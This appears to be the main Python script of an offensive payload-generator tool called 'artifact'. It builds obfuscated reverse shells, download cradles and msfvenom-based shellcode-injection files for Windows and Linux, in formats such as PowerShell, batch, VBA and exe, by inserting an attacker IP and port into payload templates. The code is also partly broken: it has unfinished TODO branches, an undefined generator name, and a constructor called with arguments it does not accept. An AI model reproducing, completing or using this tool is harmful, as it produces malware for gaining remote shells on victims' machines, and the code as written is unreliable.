#!/usr/bin/env python

try:
    import subprocess
    import argparse
    import base64
    import hashlib
    import random
    import time
except ImportError:
    print("[!] You're missing some packages, perhaps you haven't installed this tool yet?")

try:
    from .utils.artifact_library import library
    from .utils.artifact_generator import Artifact_generator 
except ImportError:
    from utils.artifact_library import library
    from utils.artifact_generator import Artifact_generator

class Artifact:
    def __init__(self):
        """ Initialize key components """
        self.string = None
        self.modified_string = None
        self.encoded_string = None
        self.byte_representation = None
        self.final_output = None

        self.ip = None
        self.port = None

        self.type = None
        self.style = None
        self.verbose = None
        self.os = None
        self.extension = None

        self.parser = argparse.ArgumentParser(
            prog='artifact',
            description='Opfuscates ... (code), (download-string) or (reverse-shells)'
        )
        self.args = None

    def parse_args(self):
        """ Create the arguments """
        self.parser.add_argument('-v', '--verbose', action='store_true', help="Verbose output")
        self.parser.add_argument('-t', '--type',
                                 help="Obfuscataion type, (base64), (base32), (base16)")
        self.parser.add_argument('-s', '--style', required=True, help="Reverse shell (rev), (download), (threadi)")
        self.parser.add_argument('-i', '--ipaddress', help="The Host IPaddress")
        self.parser.add_argument('-p', '--port', help="The Listening Port.")
        self.parser.add_argument('-o', '--os', required=True, help="Target platform, (windows/x64), (windows/x32) \
                (linux/x32), (linux/x64)")
        self.parser.add_argument('-e', '--extension', required=True, help="File extension, (ps1), (bat), (vba), (exe), (???)...")
        self.args = vars(self.parser.parse_args())

    def set_arguments(self):
        """ set the arguments to variables """
        for key, val in self.args.items():
            if key == 'type':
                self.type = val
            elif key == 'style':
                self.style = val
            elif key == 'ipaddress':
                self.ip = val
            elif key == 'port':
                self.port = val
            elif key == 'os':
                self.os = val
            elif key == 'extension':
                self.extension = val

    def grab_libstring(self):
        """ Get the string from the library """ 
        for k_os, v_os in library.items(): 
            if self.extension in v_os:
                for k_ext, v_ext in v_os[self.extension].items():
                    if k_ext == self.style:
                        self.string = v_ext

    def modify_libstring(self):
        """ if style in rev/download we replace the ip/port now """
        #TODO add logic for handling other extensions, exe first.
        if self.style in ['rev', 'download']:
            self.modified_string = self.string.replace('<ipaddress>', self.ip).replace('<port>', self.port)
            
            #TODO add handling for base64encoding this... (windows)
            #TODO also add base64encoding for linux, but that can support other like base32, base16 aswell?...
            if self.style and self.os in ['windows/x64', 'windows/x32']:
                pass
            elif self.style and self.os in ['linux/x64', 'linux/x32']:
                pass

        elif self.style == 'threadi':
            #### use msfvenom to create shellcode ####
            artifact = Artifact(self.os, self.style, 
                                self.extension,
                                self.ip, self.port, "sc")
            name = artifact_generator.msfvenom_generator()

            with open(name, 'r') as f:
                self.modified_string = self.string.replace('<shellcode>', f.read().strip())
 
            with open(f"threadi.{self.extension}", 'w') as f:
                f.write(self.modified_string)

def main():
    artifact = Artifact()
    artifact.parse_args()
    artifact.set_arguments()
    artifact.grab_libstring()
    artifact.modify_libstring()

if __name__ == '__main__':
    main()
